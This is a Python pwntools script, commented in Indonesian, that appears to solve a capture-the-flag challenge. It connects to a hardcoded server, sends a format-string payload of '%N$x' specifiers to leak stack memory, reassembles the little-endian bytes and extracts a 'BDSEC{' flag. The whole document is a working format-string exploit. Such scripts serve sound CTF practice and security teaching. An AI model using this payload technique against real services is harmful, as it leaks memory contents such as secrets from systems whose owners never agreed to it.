from pwn import *

# --- Detail Koneksi ---
host = '45.33.118.86'
port = 9992

# --- Fungsi Utama ---
def get_flag():
    """
    Menghubungkan ke server, mengirim payload format string,
    dan memproses memori yang bocor untuk menemukan flag.
    """
    # Menghubungkan ke server
    log.info(f"Menghubungkan ke {host}:{port}...")
    try:
        p = remote(host, port)
        # Menerima prompt awal dari server
        p.recvuntil(b"Enter your input: ")
    except PwnlibException as e:
        log.failure(f"Gagal terhubung: {e}")
        return

    # Membuat payload untuk membocorkan isi stack.
    # Kita akan membaca dari parameter ke-6 hingga ke-39.
    # Karakter '-' digunakan sebagai pemisah agar output mudah di-parsing.
    payload = b""
    for i in range(6, 40):
        payload += b"-%" + str(i).encode() + b"$x"
    
    log.info(f"Mengirim payload: {payload.decode()}")
    p.sendline(payload)

    # Menerima dan mem-parsing data yang bocor
    p.recvuntil(b"Buzz says: ")
    leak = p.recvline().decode().strip()
    p.close()
    log.success("Berhasil menerima data yang bocor!")

    # Memproses string heksadesimal yang bocor
    log.info("Memproses data...")
    leaked_parts = leak.split('-')[1:]  # Pisahkan berdasarkan '-' dan abaikan bagian pertama
    reconstructed_memory = b""

    for part in leaked_parts:
        try:
            # Ubah string hex menjadi bytes
            hex_bytes = bytes.fromhex(part)
            # Balik urutan byte (karena little-endian) dan gabungkan
            reconstructed_memory += hex_bytes[::-1]
        except ValueError:
            # Abaikan jika ada bagian yang bukan heksadesimal valid
            continue

    # Cari pola flag di dalam memori yang telah direkonstruksi
    try:
        # Dekode byte menjadi string
        decoded_string = reconstructed_memory.decode('latin-1')
        # Cari posisi awal dan akhir flag
        flag_start = decoded_string.find("BDSEC{")
        if flag_start != -1:
            flag_end = decoded_string.find("}", flag_start)
            if flag_end != -1:
                flag = decoded_string[flag_start : flag_end + 1]
                log.success(f"Flag ditemukan: {flag}")
                return flag
        
        log.failure("Pola flag tidak ditemukan dalam data yang bocor.")
        return None

    except UnicodeDecodeError:
        log.failure("Gagal mendekode memori yang direkonstruksi.")
        return None

# --- Jalankan Skrip ---
if __name__ == "__main__":
    get_flag()
